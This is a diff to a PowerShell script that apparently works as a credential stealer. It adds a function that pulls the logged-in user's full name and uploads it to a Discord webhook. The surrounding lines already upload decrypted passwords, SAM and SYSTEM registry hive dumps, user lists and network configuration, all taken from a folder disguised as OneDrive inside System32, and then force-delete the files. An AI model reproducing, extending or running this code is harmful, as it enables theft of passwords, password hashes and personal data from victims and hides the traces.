@@ -32,6 +32,30 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
+
+
+function Get-fullName {
+
+    try {
+
+    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+
+    }
+ 
+ 
+    catch {Write-Error "No name was detected" 
+    return $env:UserName
+    -ErrorAction SilentlyContinue
+    }
+
+    return $fullName 
+
+}
+
+$FN = Get-fullName
+$FN | Out-file ./user.txt
+
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\user.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv
@@ -39,7 +63,7 @@ Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save
 
 
-
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\user.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save" -r -Force -ErrorAction SilentlyContinue
